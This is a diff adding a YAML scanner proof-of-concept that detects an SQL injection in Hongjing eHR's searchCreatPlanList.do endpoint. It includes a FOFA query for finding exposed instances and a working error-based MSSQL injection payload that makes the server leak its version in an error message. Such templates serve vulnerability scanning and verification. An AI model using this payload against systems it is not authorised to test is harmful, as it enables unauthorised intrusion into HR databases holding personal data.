@@ -1,0 +1,23 @@
+id: poc-yaml-hjsoft-ehr-searchcreatplanlist-do-sqli
+info:
+  name: 宏景eHR searchCreatPlanList.do SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+requests:
+- method: GET
+  path: /templates/index/getpassword.jsp
+  expression: status_code == 200 && contains(body,"important")
+  output:
+  - regex_match(headers,"JSESSIONID=(?P<cookie>.*?);")
+- method: GET
+  path: /train/plan/searchCreatPlanList.do?b_selectPlan=query&selectID=1'%2B(1-@@VERSION)%2B')--+
+  headers:
+    Cookie: JSESSIONID={{.cookie}}
+  expression: status_code == 200 && contains(gbk_decode(body),"&nbsp;信息提示&nbsp;")
+    && contains(body,"Microsoft SQL Server") && matches(gbk_decode(body),"转换成数据类型(.*?)时失败")
+    && matches(gbk_decode(body),"在将(.*?)值")
+variables: {}
+transport: http
